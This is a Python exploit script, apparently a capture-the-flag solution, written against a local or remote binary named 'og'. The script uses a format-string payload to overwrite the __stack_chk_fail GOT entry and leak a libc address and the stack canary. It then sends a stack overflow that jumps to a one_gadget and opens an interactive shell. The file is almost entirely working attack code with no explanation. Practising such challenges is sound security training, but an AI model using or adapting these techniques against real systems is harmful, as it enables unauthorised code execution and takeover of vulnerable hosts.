#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./og', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


b*go+131
b*go+168
b*go+190
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    # [1]: Leak libc & canary & ret2main
    ret_addr = (exe.sym.main) & 0xffff

    pl = f'%{ret_addr}c%10$hn'.encode()
    pl += f'%15$p%33$p'.encode()
    pl = pl.ljust(0x20, b'A')
    pl += p64(exe.got.__stack_chk_fail)
    sla(b'name: ', pl)

    ru(b'0x')
    leak = int(ru(b'0x',drop=True), 16)
    canary = int(ru(b'A', drop=True), 16)
    libc.address = leak - 0x29d90
    info('Canary: ' + hex(canary))
    info('Libc leak: ' + hex(leak))
    info('Libc address: ' + hex(libc.address))

    # [2]: Get shell
    one_gadget = libc.address + 0xebc81
    pl = b'\0'*0x28 + p64(canary) + p64(0x4044b0) +p64(one_gadget)
    sla(b'name: ', pl)

    interactive()

if __name__ == '__main__':
    exploit()
